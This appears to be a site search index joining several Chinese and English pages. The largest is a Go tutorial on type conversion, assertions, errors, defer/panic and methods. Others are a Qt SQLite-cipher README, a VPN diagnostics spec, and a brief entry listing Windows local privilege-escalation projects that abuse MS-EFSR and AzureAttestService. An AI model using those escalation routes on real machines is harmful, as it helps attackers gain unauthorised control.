语言提供了一种在不同但相互兼容的类型之间相互转换的方式，这种转换非常有用并且是安全的。但是需要注意的是在数值之间进行转换可能造成其他问题，如精度丢失或者错误的结果。以下是类型转换的语法： resultOfType := Type(expression) 几个例子： 1234x := int16(2345) // 声明一个类型为int16的整数，其值为2345y := int32(x) // 将int16类型的整数转换为int32类型a := uint16(65000) // 声明一个类型为uint16类型的整数b := int16(a) // 转换为int16类型，虽然能转换成功，但是由于65000超过in16类型的范围，会导致结果错误，b的值为 -536 另外在 Go 语言中可以通过 type 关键字声明类型，如 type StringsSlice []string 将 []string（string 类型的切片）声明为 StringSlice 类型。 类型断言说到类型断言就需要先了解下 Go 语言中的接口。在 Go 语言中接口是一个自定义类型。它声明了一个或者多个方法。任何实现了这些方法的对象（类型）都满足这个接口。 接口是完全抽象的，不能实例化。interface&#123;&#125; 类型表示一个空接口，任何类型都满足空接口。也就是说 interface&#123;&#125; 类型的值可以用于表示任意 Go 语言类型的值。 这里的空接口有点类似于 Python 语言中的 object 实例。既然 interface&#123;&#125; 可以用于表示任意类型，那有的时候我们需要将 interface&#123;&#125; 类型转换为我们需要的类型，这个操作称为类型断言。 一般情况下只有我们希望表达式是某种特定类型的值时才使用类型断言。Go 语言中可以使用以下语法： resultOfType, boolean := expression.(Type)：安全的类型断言。 resultOfType := expression.(Type)：非安全的类型断言，失败时程序会产生异常。 创建源文件 type_t.go，输入以下源文件： 123456789101112131415161718192021package mainimport ( &quot;fmt&quot;)func main() &#123; x := uint16(65000) y := int16(x) // 将 x转换为int16类型 fmt.Printf(&quot;type and value of x is: %T and %d\\n&quot;, x, x) // %T 格式化指令的作用是输出变量的类型 fmt.Printf(&quot;type and value of y is: %T and %d\\n&quot;, y, y) var i interface&#123;&#125; = 99 // 创建一个interface&#123;&#125;类型，其值为99 var s interface&#123;&#125; = []string&#123;&quot;left&quot;, &quot;right&quot;&#125; j := i.(int) // 我们假设i是兼容int类型，并使用类型断言将其转换为int类型 fmt.Printf(&quot;type and value of j is: %T and %d\\n&quot;, j, j) if s, ok := s.([]string); ok &#123; // 创建了影子变量，if的作用域中覆盖了外部的变量s fmt.Printf(&quot;%T -&gt; %q\\n&quot;, s, s) &#125;&#125; 运行程序： 12345$ go run type_t.gotype and value of x is: uint16 and 65000type and value of y is: int16 and -536type and value of j is: int and 99[]string -&gt; [&quot;left&quot; &quot;right&quot;] 类型断言说到类型断言就需要先了解下 Go 语言中的接口。在 Go 语言中接口是一个自定义类型。它声明了一个或者多个方法。任何实现了这些方法的对象（类型）都满足这个接口。 接口是完全抽象的，不能实例化。interface&#123;&#125; 类型表示一个空接口，任何类型都满足空接口。也就是说 interface&#123;&#125; 类型的值可以用于表示任意 Go 语言类型的值。 这里的空接口有点类似于 Python 语言中的 object 实例。既然 interface&#123;&#125; 可以用于表示任意类型，那有的时候我们需要将 interface&#123;&#125; 类型转换为我们需要的类型，这个操作称为类型断言。 一般情况下只有我们希望表达式是某种特定类型的值时才使用类型断言。Go 语言中可以使用以下语法： resultOfType, boolean := expression.(Type)：安全的类型断言。 resultOfType := expression.(Type)：非安全的类型断言，失败时程序会产生异常。 创建源文件 type_t.go，输入以下源文件： 123456789101112131415161718192021package mainimport ( &quot;fmt&quot;)func main() &#123; x := uint16(65000) y := int16(x) // 将 x转换为int16类型 fmt.Printf(&quot;type and value of x is: %T and %d\\n&quot;, x, x) // %T 格式化指令的作用是输出变量的类型 fmt.Printf(&quot;type and value of y is: %T and %d\\n&quot;, y, y) var i interface&#123;&#125; = 99 // 创建一个interface&#123;&#125;类型，其值为99 var s interface&#123;&#125; = []string&#123;&quot;left&quot;, &quot;right&quot;&#125; j := i.(int) // 我们假设i是兼容int类型，并使用类型断言将其转换为int类型 fmt.Printf(&quot;type and value of j is: %T and %d\\n&quot;, j, j) if s, ok := s.([]string); ok &#123; // 创建了影子变量，if的作用域中覆盖了外部的变量s fmt.Printf(&quot;%T -&gt; %q\\n&quot;, s, s) &#125;&#125; 运行程序： 12345$ go run type_t.gotype and value of x is: uint16 and 65000type and value of y is: int16 and -536type and value of j is: int and 99[]string -&gt; [&quot;left&quot; &quot;right&quot;] 错误处理错误处理是任何语言都需要考虑到的问题，而 Go 语言在错误处理上解决得更为完善，优雅的错误处理机制是 Go 语言的一大特点。 errorGo 语言引入了一个错误处理的标准模式，即 error 接口，该接口定义如下： 123type error interface &#123; Error() string&#125; 对于大多数函数，如果要返回错误，可以将 error 作为多返回值的最后一个： 1234func foo(param int)(ret int, err error)&#123; ...&#125; 调用时的代码： 123456n, err := foo(0)if err != nil &#123; // 错误处理&#125; else &#123; // 使用返回值n&#125; 我们还可以自定义错误类型，创建源文件 error.go，输入以下代码： 1234567891011121314151617181920212223242526272829303132333435package mainimport &quot;fmt&quot;import &quot;errors&quot;//自定义的出错结构type myError struct &#123; arg int errMsg string&#125;//实现Error接口func (e *myError) Error() string &#123; return fmt.Sprintf(&quot;%d - %s&quot;, e.arg, e.errMsg)&#125;//两种出错func error_test(arg int) (int, error) &#123; if arg &lt; 0 &#123; return -1, errors.New(&quot;Bad Arguments - negtive!&quot;) &#125;else if arg &gt;256 &#123; return -1, &amp;myError&#123;arg, &quot;Bad Arguments - too large!&quot;&#125; &#125; return arg*arg, nil&#125;//相关的测试func main() &#123; for _, i := range []int&#123;-1, 4, 1000&#125; &#123; if r, e := error_test(i); e != nil &#123; fmt.Println(&quot;failed:&quot;, e) &#125; else &#123; fmt.Println(&quot;success:&quot;, r) &#125; &#125;&#125; defer你可以在 Go 函数中添加多个 defer 语句，当函数执行到最后时，这些 defer 语句会按照逆序执行（即最后一个 defer 语句将最先执行），最后该函数返回。特别是当你在进行一些打开资源的操作时，遇到错误需要提前返回，在返回前你需要关闭相应的资源，不然很容易造成资源泄露等问题。如下代码所示，我们一般写打开一个资源是这样操作的： 1234567891011121314151617func CopyFile(dst, src string) (w int64, err error) &#123; srcFile, err := os.Open(src) if err != nil &#123; return &#125; defer srcFile.Close() dstFile, err := os.Create(dst) if err != nil &#123; return &#125; defer dstFile.Close() return io.Copy(dstFile, srcFile)&#125; 如果 defer 后面一条语句干不完清理工作，也可以使用一个匿名函数： 123defer func()&#123; ...&#125;() 注意，defer 语句是在 return 之后执行的，新建源文件 defer.go 输入以下代码： 12345678910func test() (result int) &#123; defer func() &#123; result = 12 &#125;() return 10&#125;func main() &#123; fmt.Println(test()) // 12&#125; panicpanic() 函数用于抛出异常，recover() 函数用于捕获异常，这两个函数的原型如下： 12func panic(interface&#123;&#125;)func recover() interface&#123;&#125; 当在一个函数中调用 panic() 时，正常的函数执行流程将立即终止，但函数中之前使用 defer 关键字延迟执行的语句将正常展开执行，之后该函数将返回到调用函数，并导致逐层向上执行 panic() 流程，直至所属的 goroutine 中所有正在执行的函数被终止。错误信息将被报告，包括在调用 panic() 函数时传入的参数，这个过程称为错误流程处理。 panic() 接受一个 interface&#123;&#125; 参数，可支持任意类型，例如： 123panic(404)panic(&quot;network broken&quot;)panic(Error(&quot;file not exists&quot;)) 在 defer 语句中，可以使用 recover() 终止错误处理流程，这样可以避免异常向上传递，但要注意 recover() 之后，程序不会再回到 panic() 那里，函数仍在 defer 之后返回。新建一个源文件 error1.go，输入以下代码： 12345678910111213141516171819func foo() &#123; panic(errors.New(&quot;i&#x27;m a bug&quot;)) return&#125;func test() (result int) &#123; defer func() &#123; if r := recover(); r != nil &#123; err := r.(error) fmt.Println(&quot;Cache Exception:&quot;, err) &#125; &#125;() foo() return 10&#125;func main() &#123; fmt.Println(test()) // 0&#125; 面向对象编程自定义类型Go 语言的中结构体 struct 与 C++、JAVA 中的类 class 相似，但 Go 放弃了传统面向对象的诸多特性，只保留了组合。 type typeName typeSpecification 其中，typeName 可以是一个包或者函数内唯一合法的 Go 标示符。typeSpecification 可以是任何内置的类型，一个接口或者是一个结构体。所谓结构体，它的字段是由其他类型或者接口组成。例如我们通过结构体定义了一下类型： 1234type ColorPoint struct &#123; color.Color // 匿名字段(嵌入) x, y int // 具名字段(聚合)&#125; 以上代码我们通过结构体自定义了类型 ColorPoint，结构体中 color.Color 字段是 Color 包的类型 color，这个字段没有名字，所以被称为匿名的，也是嵌入字段。字段 x 和 y 是有变量名的，所以被称为具名字段。假如我们创建了类型 ColorPoint 的一个值 point（通过语法：point := ColorPoint&#123;&#125; 创建），那么这些字段可以通过 point.Color、point.x、point.y 访问。其他面向对象语言中的”类 (class)”、”对象 (object)”、”实例 (instance)”在 Go 语言中我们完全避开使用。相反的我们使用”类型 (type)”和其对应的”值”，其中自定义类型的值可以包含方法。 定义了结构体后如何创建并初始化一个对象实例呢？Go 语言支持以下几种方法进行实现： 12345678910//先定义一个结构体Mantype Man struct&#123; name string age int&#125;//对象创建与初始化man := new(Man)man := &amp;Man&#123;&#125;man := &amp;Man&#123;&quot;Tom&quot;, 18&#125;man := &amp;Man&#123;name: &quot;Tom&quot;, age: 18&#125; 为了更加方便的创建对象，我们一般会使用一个全局函数来完成对象的创建，这和传统的“构造函数”类似。 123func NewMan(name string, age int) *Man &#123; return &amp;Man&#123;name, age&#125;&#125; 方法方法是作用在自定义类型上的一类特殊函数，通常自定义类型的值会被传递给该函数，该值可能是以指针或者复制值的形式传递。定义方法和定义函数几乎相同，只是需要在 func 关键字和方法名之间必须写上接接受者。例如我们给类型 Count 定义了以下方法： 12345type Count intfunc (count *Count) Increment() &#123; *count++ &#125; // 接受者是一个 `Count` 类型的指针func (count *Count) Decrement() &#123; *count-- &#125;func (count Count) IsZero() bool &#123; return count == 0 &#125; 以上代码中，我们在内置类型 int 的基础上定义了自定义类型 Count，然后给该类型添加了 Increment()、Decrement() 和 IsZero() 方法，其中前两者的接受者为 Count 类型的指针，后一个方法接收 Count 类型的值。 类型的方法集是指可以被该类型的值调用的所有方法的集合。 一个指向自定义类型的值的指针，它的方法集由该类型定义的所有方法组成，无论这些方法接受的是一个值还是一个指针。如果在指针上调用一个接受值的方法，Go 语言会聪明地将该指针解引用。 一个自定义类型值的方法集合则由该类型定义的接收者为值类型的方法组成，但是不包括那些接收者类型为指针的方法。 其实这些限制 Go 语言帮我们解决的非常好，结果就是我们可以在值类型上调用接收者为指针的方法。假如我们只有一个值，仍然可以调用一个接收者为指针类型的方法，这是因为 Go 语言会自动获取值的地址传递给该方法，前提是该值是可寻址的。 在以上定义的类型 Count 中，*Count 方法集是 Increment(), Decrement() 和 IsZero()，Count 的值的方法集是 IsZero()。但是因为 Count 类型的是可寻址的，所以我们可以使用 Count 的值调用全部的方法。 另外如果结构体的字段也有方法，我们也可以直接通过结构体访问字段中的方法。下面让我们练习下，创建源文件 struct_t.go，输入以下代码： 123456789101112131415161718192021222324252627282930313233343536package mainimport &quot;fmt&quot;type Count int // 创建自定义类型 Countfunc (count *Count) Increment() &#123; *count++ &#125; // Count类型的方法func (count *Count) Decrement() &#123; *count-- &#125;func (count Count) IsZero() bool &#123; return count == 0 &#125;type Part struct &#123; // 基于结构体创建自定义类型 Part stat string Count // 匿名字段&#125;func (part Part) IsZero() bool &#123; // 覆盖了匿名字段Count的IsZero()方法 return part.Count.IsZero() &amp;&amp; part.stat == &quot;&quot; // 调用了匿名字段的方法&#125;func (part Part) String() string &#123; // 定义String()方法，自定义了格式化指令%v的输出 return fmt.Sprintf(&quot;&lt;&lt;%s, %d&gt;&gt;&quot;, part.stat, part.Count)&#125;func main() &#123; var i Count = -1 fmt.Printf(&quot;Start \\&quot;Count\\&quot; test:\\nOrigin value of count: %d\\n&quot;, i) i.Increment() fmt.Printf(&quot;Value of count after increment: %d\\n&quot;, i) fmt.Printf(&quot;Count is zero t/f? : %t\\n\\n&quot;, i.IsZero()) fmt.Println(&quot;Start: \\&quot;Part\\&quot; test:&quot;) part := Part&#123;&quot;232&quot;, 0&#125; fmt.Printf(&quot;Part: %v\\n&quot;, part) fmt.Printf(&quot;Part is zero t/f? : %t\\n&quot;, part.IsZero()) fmt.Printf(&quot;Count in Part is zero t/f?: %t\\n&quot;, part.Count.IsZero()) // 尽管覆盖了匿名字段的方法，单还是可以访问&#125; 以上代码中，我们创建了 Count 类型，然后在其基础上又创建了结构体类型 Part。我们为 Count 类型定义了 3 个方法，并在 Part 类型中创建了方法 IsZero() 覆盖了其匿名字段 Count 中 IsZero() 方法。但是我们还是可以二次访问到匿名字段中被覆盖的方法。执行代码，输出如下： 123456789101112$ go run struct_t.goStart &quot;Count&quot; test:Origin value of count: -1Value of count after increment: 0Count is zero t/f? : trueStart: &quot;Part&quot; test:Part: &lt;&lt;232, 0&gt;&gt;Part is zero t/f? : falseCount in Part is zero t/f?: true"},{"title":"【提权】提权漏洞及思路整理","date":"2023-11-23T16:00:00.000Z","path":"wiki/安全/提权/【提权】提权漏洞及思路整理.html","text":"概述：windows 提权的各种途径整理 提权方案整理 crisprss&#x2F;PetitPotam: 替代PrintBug用于本地提权的新方式，主要利用MS-EFSR协议中的接口函数 借鉴了Potitpotam中对于EFSR协议的利用,实现了本地提权的一系列方式 Drawing on the use of the EFSR protocol in Potitpotam, a series of local rights escalation methods have been realized crisprss&#x2F;magicAzureAttestService: 针对于AzureAttestService服务的本地提权Eop，微软表示已经进行修复"},{"title":"","date":"2023-10-27T01:52:41.074Z","path":"more/Demo/Qt/QSqlCipherView/README.html","text":"QtCipherSqlitePluginA Qt plugin for cipher SQLite which is based on SQLite source and wxSQLite3 in wxWidget. Qt is a full development framework with tools designed to streamline the creation of applications and user interfaces for desktop, embedded and mobile platforms. You could find more details at https://www.qt.io. SQLite is a software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine. SQLite is the most widely deployed SQL database engine in the world. The source code for SQLite is in the public domain. You could find more details at http://www.sqlite.org/. wxSQLite3 is a C++ wrapper around the public domain SQLite 3.x database and is specifically designed for use in programs based on the wxWidgets library. wxSQLite3 includes an optional extension for SQLite supporting key based database file encryption using 128 bit AES encryption. You could find more details at http://utelle.github.io/wxsqlite3. wxSQLite3 is released under wxWindows Library Licence. You could find how to compile this plugin at http://qtciphersqliteplugin.galaxyworld.org. Please read Wiki for more details."},{"title":"","date":"2023-10-27T01:52:39.934Z","path":"more/Demo/Qt/QSqlCipherView/CHANGELOG.html","text":"1.3 (To be decided) Update to Sqlite 3.37.0 Update to wxSqlite3 to main branch Support Qt 6 Tested on following versions: Qt 5.15.2 MSVC2019 Qt 6.2.1 MSVC2019 1.2 (2018-09-08) Add legacy_page_size connection options for all ciphers. 1.1 (2018-08-17)1.0 (2018-07-23) Update wxSQLite3 to 4.0.4 Add Qt private configuration in order to use Qt private headers. Support multiple ciphers, including AES128CBC, AES256CBC, CHACHA20 and SQLCIPHER. 0.7 (2017-04-08) Update sqlitecipher plugin debug name pattern on Mac OS. Port test code to iOS. 0.6 (2017-03-20) Fix a crash bug compiling with gcc. Update sqlite to 3.17.0 Update wxSqlite3 to 3.5.2 0.5 (2016-05-20) Copy private Qt sources to this project. 0.4 (2016-05-19) Update sqlite to 3.12.2 Update wxSqlite3 to 3.3.1 Update driver code to Qt 5.6. Now we could support Qt 5.0 to 5.6, but not for 5.7. Improve Qt private path settings. Add password create, update and remove. Thanks to @topillar Return false when password is incorrect. 0.3 (2014-09-20) Add password paramater to open() function. Update sqlite to 3.8.5 Update wxSqlite3 to 3.1.0 0.2 (2013-01-09) Update sqlite to 3.7.15.1 Support for Qt 5 0.1 (2012-09-27) sqlite 3.7.13"},{"title":"","date":"2023-10-16T05:25:59.605Z","path":"more/Demo/Qt/QSqlCipher/CHANGELOG.html","text":"1.3 (To be decided) Update to Sqlite 3.37.0 Update to wxSqlite3 to main branch Support Qt 6 Tested on following versions: Qt 5.15.2 MSVC2019 Qt 6.2.1 MSVC2019 1.2 (2018-09-08) Add legacy_page_size connection options for all ciphers. 1.1 (2018-08-17)1.0 (2018-07-23) Update wxSQLite3 to 4.0.4 Add Qt private configuration in order to use Qt private headers. Support multiple ciphers, including AES128CBC, AES256CBC, CHACHA20 and SQLCIPHER. 0.7 (2017-04-08) Update sqlitecipher plugin debug name pattern on Mac OS. Port test code to iOS. 0.6 (2017-03-20) Fix a crash bug compiling with gcc. Update sqlite to 3.17.0 Update wxSqlite3 to 3.5.2 0.5 (2016-05-20) Copy private Qt sources to this project. 0.4 (2016-05-19) Update sqlite to 3.12.2 Update wxSqlite3 to 3.3.1 Update driver code to Qt 5.6. Now we could support Qt 5.0 to 5.6, but not for 5.7. Improve Qt private path settings. Add password create, update and remove. Thanks to @topillar Return false when password is incorrect. 0.3 (2014-09-20) Add password paramater to open() function. Update sqlite to 3.8.5 Update wxSqlite3 to 3.1.0 0.2 (2013-01-09) Update sqlite to 3.7.15.1 Support for Qt 5 0.1 (2012-09-27) sqlite 3.7.13"},{"title":"","date":"2023-10-16T05:25:59.616Z","path":"more/Demo/Qt/QSqlCipher/README.html","text":"QtCipherSqlitePluginA Qt plugin for cipher SQLite which is based on SQLite source and wxSQLite3 in wxWidget. Qt is a full development framework with tools designed to streamline the creation of applications and user interfaces for desktop, embedded and mobile platforms. You could find more details at https://www.qt.io. SQLite is a software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine. SQLite is the most widely deployed SQL database engine in the world. The source code for SQLite is in the public domain. You could find more details at http://www.sqlite.org/. wxSQLite3 is a C++ wrapper around the public domain SQLite 3.x database and is specifically designed for use in programs based on the wxWidgets library. wxSQLite3 includes an optional extension for SQLite supporting key based database file encryption using 128 bit AES encryption. You could find more details at http://utelle.github.io/wxsqlite3. wxSQLite3 is released under wxWindows Library Licence. You could find how to compile this plugin at http://qtciphersqliteplugin.galaxyworld.org. Please read Wiki for more details."},{"title":"","date":"2023-10-16T05:25:59.390Z","path":"more/Demo/Go/DesignPattern/00_simple_Factory/README.html","text":"简单工厂模式go 语言没有构造函数一说，所以一般会定义NewXXX函数来初始化相关类。 NewXXX 函数返回接口时就是简单工厂模式，也就是说Golang的一般推荐做法就是简单工厂。 在这个simplefactory包中只有API 接口和NewAPI函数为包外可见，封装了实现细节。"},{"title":"Qt 全局注册快捷键","date":"2023-10-16T05:26:00.138Z","path":"more/Demo/Visual Studio/Qt/QGlobalKeyShort/README.html","text":"Qt 提供了 QShortcut 来实现快捷键的功能，不过它的响应范围只局限于窗口内。如果脱离了进程窗口，如在桌面，或者正在使用其他软件，是无法响应的。 要解决这样的问题可以使用 Windows 提供的 API 再结合qt的一些功能来实现一个全局可响应的快捷键。 直接行代码，首先在 main 函数添加快捷绑定进行注册 MyGlobalShortCut *shortcut = new MyGlobalShortCut(&quot;Ctrl+Down&quot;, &amp;w); QObject::connect(shortcut, SIGNAL(activated()), &amp;w, SLOT(rec_testShotCutAns())); 然后添加 MyGlobalShortCut.h"},{"title":"","date":"2023-10-16T05:26:00.389Z","path":"more/Demo/Visual Studio/WinAPI/NcDetection/readme.html","text":"NC异常检测(NCQuery)及修复(NcRecovery)说明[toc] 1. NC异常检测(NCQuery)检测模块 虚拟网卡(netcard) 检查虚拟网卡的状态（禁用、启用、未启用） 通信服务及部分操作(ncopt) 与 Trustcore 的通信及网卡启动前操作 vnic 检查虚拟ip的分配是否成功 路由 检查路由表&gt; 返回结构12345678910111213141516171819202122232425262728293031323334353637383940&#123; &quot;error_code&quot;: 0, &quot;message&quot;: &quot;Configure vnic Success&quot;, &quot;modules&quot;: [ &#123; &quot;level&quot;: &quot;INFO&quot;, &quot;message&quot;: &quot;Create remote vnip success&quot;, &quot;name&quot;: &quot;ncip&quot;, &quot;status&quot;: &quot;0&quot;, &quot;time&quot;: &quot; 2023-04-07T10:33:14Z&quot; &#125;, &#123; &quot;level&quot;: &quot;INFO&quot;, &quot;message&quot;: &quot;Get &amp; Set OPtions Success&quot;, &quot;name&quot;: &quot;ncopt&quot;, &quot;status&quot;: &quot;0&quot;, &quot;time&quot;: &quot; 2023-04-07T10:33:14Z&quot; &#125;, &#123; &quot;level&quot;: &quot;INFO&quot;, &quot;message&quot;: &quot;Configure vnic Success&quot;, &quot;name&quot;: &quot;netcard&quot;, &quot;options&quot;: &quot;&#123;\\&quot;data\\&quot;: &#123;\\&quot;block_exclude_lan\\&quot;: 0, \\&quot;block_internet\\&quot;: 0, \\&quot;dns\\&quot;: [], \\&quot;dns4\\&quot;: [], \\&quot;dns6\\&quot;: [], \\&quot;dns_suffix\\&quot;: \\&quot;\\&quot;, \\&quot;ip\\&quot;: \\&quot;1.1.1.114\\&quot;, \\&quot;ipv4\\&quot;: \\&quot;1.1.1.114\\&quot;, \\&quot;mask\\&quot;: \\&quot;255.255.255.255\\&quot;, \\&quot;route_assign4\\&quot;: [], \\&quot;route_assign6\\&quot;: [], \\&quot;route_auto\\&quot;: \\&quot;1\\&quot;, \\&quot;route_includes4\\&quot;: [\\&quot;1.1.1.1/32\\&quot;, \\&quot;10.41.3.204/32\\&quot;, \\&quot;10.41.3.222/32\\&quot;, \\&quot;10.44.250.1/32\\&quot;, \\&quot;10.44.250.2/31\\&quot;, \\&quot;10.44.250.4/30\\&quot;, \\&quot;10.44.250.8/29\\&quot;, \\&quot;10.44.250.16/28\\&quot;, \\&quot;10.44.250.32/27\\&quot;, \\&quot;10.44.250.64/26\\&quot;, \\&quot;10.44.250.128/30\\&quot;, \\&quot;10.44.250.134/31\\&quot;, \\&quot;10.44.250.136/29\\&quot;, \\&quot;10.44.250.144/28\\&quot;, \\&quot;10.44.250.160/27\\&quot;, \\&quot;10.44.250.192/27\\&quot;, \\&quot;10.44.250.224/28\\&quot;, \\&quot;10.44.250.240/29\\&quot;, \\&quot;10.44.250.248/30\\&quot;, \\&quot;10.44.250.252/31\\&quot;, \\&quot;10.44.250.254/32\\&quot;, \\&quot;10.92.2.33/32\\&quot;, \\&quot;10.92.2.250/32\\&quot;, \\&quot;10.92.3.132/32\\&quot;, \\&quot;198.18.0.0/30\\&quot;, \\&quot;198.18.0.4/31\\&quot;, \\&quot;198.18.0.6/32\\&quot;], \\&quot;route_opt\\&quot;: \\&quot;0\\&quot;, \\&quot;vpn_host\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;vpn_ip\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;vpn_ip4\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;vpn_port\\&quot;: \\&quot;443\\&quot;&#125;, \\&quot;errcode\\&quot;: \\&quot;0\\&quot;&#125;&quot;, &quot;status&quot;: &quot;0&quot;, &quot;time&quot;: &quot; 2023-04-07T10:33:22Z&quot; &#125;, &#123; &quot;level&quot;: &quot;INFO&quot;, &quot;message&quot;: &quot;Add route table Success&quot;, &quot;name&quot;: &quot;route&quot;, &quot;routetable&quot;: &quot;[\\&quot;1.1.1.1/32\\&quot;, \\&quot;10.41.3.204/32\\&quot;, \\&quot;10.41.3.222/32\\&quot;, \\&quot;10.44.250.1/32\\&quot;, \\&quot;10.44.250.2/31\\&quot;, \\&quot;10.44.250.4/30\\&quot;, \\&quot;10.44.250.8/29\\&quot;, \\&quot;10.44.250.16/28\\&quot;, \\&quot;10.44.250.32/27\\&quot;, \\&quot;10.44.250.64/26\\&quot;, \\&quot;10.44.250.128/30\\&quot;, \\&quot;10.44.250.134/31\\&quot;, \\&quot;10.44.250.136/29\\&quot;, \\&quot;10.44.250.144/28\\&quot;, \\&quot;10.44.250.160/27\\&quot;, \\&quot;10.44.250.192/27\\&quot;, \\&quot;10.44.250.224/28\\&quot;, \\&quot;10.44.250.240/29\\&quot;, \\&quot;10.44.250.248/30\\&quot;, \\&quot;10.44.250.252/31\\&quot;, \\&quot;10.44.250.254/32\\&quot;, \\&quot;10.92.2.33/32\\&quot;, \\&quot;10.92.2.250/32\\&quot;, \\&quot;10.92.3.132/32\\&quot;, \\&quot;198.18.0.0/30\\&quot;, \\&quot;198.18.0.4/31\\&quot;, \\&quot;198.18.0.6/32\\&quot;]&quot;, &quot;status&quot;: &quot;0&quot;, &quot;time&quot;: &quot; 2023-04-07T10:33:22Z&quot; &#125; ], &quot;os&quot;: &quot;windows&quot;, &quot;service&quot;: &quot;trustnc&quot;, &quot;state&quot;: &quot;R&quot;, &quot;time&quot;: &quot; 2023-04-07T10:33:22Z&quot;&#125; netcard 参数 父节点 类型 说明 netcard \\ 返回虚拟网卡相关状态 level netcard string 返回异常状态的级别 status netcard string 返回虚拟网卡状态的状态码 options Netcard string (独有)返回虚拟网卡的配置信息 message netcard string 返回状态码对应的描述信息 ncip 参数 父节点 类型 说明 ncip \\ 返回虚拟ip相关状态 level ncip string 返回异常状态的级别level status ncip string 返回虚拟ip的状态码 message ncip string 返回状态码对应的描述信息 ncopt 参数 父节点 类型 说明 ncopt \\ 返回nc通信的状态 level ncopt string 返回异常状态的级别 status ncopt string 返回通信状态的状态码 message ncopt string 返回状态码对应的描述信息 route 参数 父节点 类型 说明 route \\ 返回路由信息 status route string 返回路由的状态码 level route string 返回异常状态的级别 message route string 返回路由状态码对应的描述信息 routetable route string 返回路由表的json字符串 Status 说明 虚拟网卡 通信服务 vnic 路由 1. 虚拟网卡[0,1,2~100] level status message 描述 处置动作 0 正常状态 0 1. opened 正常状态：启用虚拟网卡成功 0 2. HKLM Query Class Success 正常状态： 0 3. HKLM Query Network Success 正常状态： 0 4. Find Friendly Name 正常状态： 0 Connect has started 正常状态： 1 unknown 初始化状态 2 Not Found Device Vnic 未找到vnic设备 重新安装 3 Configure vnic failed 设置网卡信息失败（ip、网关、掩码、dns等） 重新获取网卡配置并设置 4 HKLM Query Faild 查询注册表失败 一般情况下还是网卡未安装 2. 通信及操作(ncopt)[0,1,101~200] level status message 描述 处置动作 INFO 0 1. normal 正常状态 INFO 0 Get &amp; Set OPtions Success 获取配置和设置句柄成功 0 Configure vnic Success 正常状态：连接core成功 INFO 0 Connect has started 虚拟网卡已经启动 ？ INFO 1 unknown 初始化状态 ERROR 101 Send initial msg to vpncore failed 发送PTUN请求失败 重新获取配置 ERROR 102 Send initial msg to vpncore failed with option 发送默认路由失败 重新获取配置 ERROR 103 Recv msg header from vpncore failed 接收PTUN消息失败 重新获取配置 ERROR 104 Alloc for msg_body failed 初始化内存失败 重新获取配置 ERROR 105 Recv initial msg response from vpnclient failed 接收消息失败 重新获取配置 ERROR 106 NC options is null 获取NC配置为空 ? ERROR 107 Set Handler Failed 设置控制句柄失败 重新获取配置 3. vnic[0,1,201~300] level status message 描述 处置动作 INFO 0 1. 正常状态 INFO 1 unknown 初始化状态 ERROR 201 Create remote ip failed 创建虚拟ip失败 重新创建且重新走开启虚拟网卡流程 4. 路由表[0,1,301~400] level status message 描述 处置动作 INFO 0 正常状态 INFO 0 Add route table Success 添加路由（同时保存路由表） INFO 1 unknown 初始化状态 ERROR 301 Add route table failed 添加路由失败 重新添加 302 Repair route table failed 修复路由失败 2. NC异常修复(NcRecovery)异常修复针对针对上一节中的 Status 对应的处置动作详细说明。对nc内部发生的异常可供内部修复的项目进行处理。 1234567891011121314151617181920212223242526&#123; &quot;ncip&quot;: &#123; &quot;message&quot;: &quot;unknown&quot;, &quot;status&quot;: &quot;1&quot; &#125;, &quot;ncopt&quot;: &#123; &quot;message&quot;: &quot;unknown&quot;, &quot;status&quot;: &quot;1&quot; &#125;, &quot;netcard&quot;: &#123; &quot;level&quot;: &quot;INFO&quot;, &quot;message&quot;: &quot;Add route table Success&quot;, &quot;options&quot;: &quot;&#123;\\&quot;L4\\&quot;: &#123;\\&quot;hostname_excludes\\&quot;: [], \\&quot;hostname_includes\\&quot;: [\\&quot;www.test.com\\&quot;, \\&quot;www.qianxin.com\\&quot;, \\&quot;aa.com\\&quot;], \\&quot;proxy_port\\&quot;: 50568, \\&quot;proxy_rules\\&quot;: [&#123;\\&quot;action\\&quot;: \\&quot;bypass\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;10.44.250.132\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;10.44.250.132\\&quot;, \\&quot;port_max\\&quot;: 443, \\&quot;port_min\\&quot;: 443, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;bypass\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;10.44.250.132\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;10.44.250.132\\&quot;, \\&quot;port_max\\&quot;: 443, \\&quot;port_min\\&quot;: 443, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;bypass\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;port_max\\&quot;: 443, \\&quot;port_min\\&quot;: 443, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;redirect\\&quot;, \\&quot;family\\&quot;: \\&quot;ipv4\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;1.1.1.1\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;1.1.1.1\\&quot;, \\&quot;port_max\\&quot;: 3, \\&quot;port_min\\&quot;: 3, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;redirect\\&quot;, \\&quot;family\\&quot;: \\&quot;ipv4\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;10.44.250.134\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;10.44.250.134\\&quot;, \\&quot;port_max\\&quot;: 80, \\&quot;port_min\\&quot;: 80, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;redirect\\&quot;, \\&quot;family\\&quot;: \\&quot;ipv4\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;10.92.2.33\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;10.92.2.33\\&quot;, 